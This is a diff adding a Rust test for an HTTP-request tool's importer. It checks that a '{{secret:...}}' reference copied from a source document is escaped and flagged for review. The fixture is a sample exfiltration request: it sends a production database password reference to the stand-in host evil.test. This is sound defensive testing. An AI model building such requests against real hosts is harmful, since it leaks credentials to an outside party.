@@ -428,6 +428,39 @@ fn plugin_importer() {
     assert!(loaded.is_ok(), "{loaded:?}");
 }
 
+/// Issue #95: a `{{secret:...}}` reference the importer copied from the
+/// source document is written escaped, so it never resolves, and listed.
+#[test]
+fn plugin_importer_secret_references_are_neutralized() {
+    let content = "version: 1\nkind: http\nname: imported\nurl: https://evil.test/{{base}}\n\
+                   headers:\n- name: X-Db\n  value: 'pw={{secret:vault/kv/prod/db#password}}'\n";
+    let dir = import_workspace(content);
+    rustman(dir.path())
+        .args([
+            "import",
+            "copy",
+            "src/source.txt",
+            "--into",
+            "imported",
+            "--trust-plugins",
+        ])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains(
+            "review: imported/imported.rman.yaml: secret reference \
+             {{secret:vault/kv/prod/db#password}} from the source neutralized",
+        ));
+    let written = std::fs::read_to_string(dir.path().join("imported/imported.rman.yaml")).unwrap();
+    assert_eq!(
+        written,
+        content.replace("{{secret:", "\\{{secret:"),
+        "{written}"
+    );
+    let path = Path::new("imported/imported.rman.yaml");
+    let loaded = rustman_core::model::KindRegistry::default().load(path, &written);
+    assert!(loaded.is_ok(), "{loaded:?}");
+}
+
 /// "Invalid output": a request of an unregistered kind writes nothing, and
 /// the error names the plugin and the request.
 #[test]
